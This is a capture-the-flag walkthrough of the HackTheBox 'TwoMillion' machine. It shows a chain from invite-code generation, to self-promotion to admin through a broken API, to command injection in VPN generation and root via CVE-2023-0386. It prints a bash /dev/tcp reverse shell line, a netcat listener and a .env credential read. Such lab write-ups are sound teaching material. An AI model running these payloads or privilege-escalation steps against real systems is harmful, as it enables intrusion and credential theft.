## Network Scan

The engagement starts with a full Nmap scan to identify open ports, running services, and the operating system.

```bash
nmap 10.10.11.221 -Pn -sC -sV -O -oN scan_full.txt
```

|Flag|Purpose|
|---|---|
|`-Pn`|Disables host discovery — treats all hosts as online|
|`-sC`|Runs default NSE scripts|
|`-sV`|Detects service versions|
|`-O`|Detects the operating system|
|`-oN scan_full.txt`|Saves output to a file|

The scan confirms SSH is running on the machine — relevant later for establishing a stable shell once credentials are found.

## Host Configuration

The domain name discovered during the scan is added to the local `/etc/hosts` file so the target resolves correctly by hostname.

```bash
echo "10.10.11.221  2million.htb" >> /etc/hosts
```

## Directory Enumeration

With the host resolving, Gobuster is used to brute-force directories on the web application and map its attack surface.

```bash
gobuster dir \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://2million.htb \
  -b 301
```

Two directories of interest are found: `/invite` and `/login`.

## Invite Code Generation

### Discovering the API Endpoints

Navigating to `/invite` reveals a reference to a JavaScript file: `inviteapi.min.js`. The file is obfuscated to hinder analysis, so it is de-obfuscated using [De4JS](https://de4js.kshift.me/). This exposes two internal API endpoints:

- `/api/v1/invite/verify`
- `/api/v1/invite/how/to/generate`

### Decrypting the Hint

A POST request is sent to `/api/v1/invite/how/to/generate` via Burp Suite. The response contains an encrypted message. The encryption method is identified as **ROT13** — a simple Caesar cipher that shifts each letter by 13 positions. After decryption, the message instructs that generating an invite code requires a POST request to `/api/v1/invite/generate`.

### Generating the Code

Following the decrypted instructions, a POST request is sent to `/api/v1/invite/generate`. The server returns a Base64-encoded invite code:

```
NlJXOEktMlhOTlAtUFpOSkwtVFlaR04=
```

It is decoded as follows:

```bash
echo "NlJXOEktMlhOTlAtUFpOSkwtVFlaR04=" | base64 -d
```

> Account registration requires a valid invite code — this is the only way to create a user on the platform. The obfuscation and multi-step encoding chain suggest the developers intentionally restricted self-registration.

## Authentication & Admin Privilege Escalation

### Logging In

Using the decoded invite code, a new account is registered. The application redirects to `/home` upon successful login.

### Exploring the API

In the `/access` section, a VPN configuration pack can be downloaded. Intercepting the request with Burp Suite reveals it serves an OpenVPN config file. Sending a GET request to `/api/v1` enumerates the full API surface, exposing an admin authentication endpoint.

|Method|Endpoint|Purpose|
|---|---|---|
|`GET`|`/api/v1/admin/auth`|Check if current user is an admin|
|`PUT`|`/api/v1/admin/settings/update`|Update user settings|

### Escalating to Admin

A PUT request is sent to `/api/v1/admin/settings/update`. The server-side validation is enforced progressively, revealing the required parameters one error at a time:

1. The `Content-Type` header must be set to `application/json`
2. The body must include the `email` parameter
3. The body must include `is_admin` set to `1` (the server rejects `true`)

```json
{
  "email": "user@2million.htb",
  "is_admin": 1
}
```

A successful response returns:

```json
{
  "message": true
}
```

> This is a broken access control vulnerability — the API allows any authenticated user to promote themselves to admin simply by sending the right parameters. There is no server-side check verifying that the requesting user has the authority to make this change.

## Command Injection via VPN Generation

### Identifying the Vulnerability

Now authenticated as admin, navigating to `/vpn/generate` triggers the generation of a new VPN config. The backend passes the `username` parameter directly to a PHP system function without sanitisation — a classic **OS command injection** vulnerability. This means arbitrary shell commands can be appended to the username value and executed by the server.

### Crafting the Reverse Shell

A reverse shell payload is crafted and Base64-encoded to avoid issues with special characters in the HTTP request:

```bash
bash -i >& /dev/tcp/10.10.14.2/1234 0>&1
```

The encoded payload is injected into the `username` field of the VPN generation request. Before sending, a Netcat listener is started on the attacker machine to catch the incoming connection.

```bash
nc -lvnp 1234
```

The server executes the injected command and the shell connects back, granting remote code execution on the target.

## Lateral Movement — User Flag

Inside the reverse shell, the current user has limited privileges. The `admin` user's home directory is found to contain `user.txt`. Lateral movement is performed to the admin user to read the flag.

## Credential Discovery via .env File

With access to the filesystem, hidden files are listed in the web application's root directory, revealing a `.env` file containing plaintext database credentials.

```bash
ls -al
cat .env
```

> `.env` files are used by web frameworks to store environment variables such as database credentials, API keys, and secrets. They are never meant to be publicly accessible — finding one on a live system is a critical misconfiguration. The credentials here belong to the admin database user.

## SSH Access

Recalling from the initial Nmap scan that SSH is running, the admin credentials found in the `.env` file are used to log in directly — providing a stable, fully interactive shell without relying on the reverse shell.

```bash
ssh admin@10.10.11.221
```

## Privilege Escalation — CVE-2023-0386

### Identifying the Vulnerability

A mail file found on the system hints at a known kernel CVE. The kernel version is checked to confirm.

```bash
uname -a
```

The running kernel is vulnerable to **CVE-2023-0386**, a local privilege escalation flaw in the Linux kernel's **OverlayFS** implementation. OverlayFS is a union filesystem that layers directories on top of each other. The vulnerability arises because the kernel incorrectly preserves **SUID** bits when files are copied between overlay layers, allowing an unprivileged user to execute a SUID binary as root without having the rights to set it.

### Exploitation

The public PoC is cloned on the attacker machine and transferred to the target.

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386
```

Following the PoC steps executes the exploit, abuses the SUID mishandling, and escalates privileges to **root**.
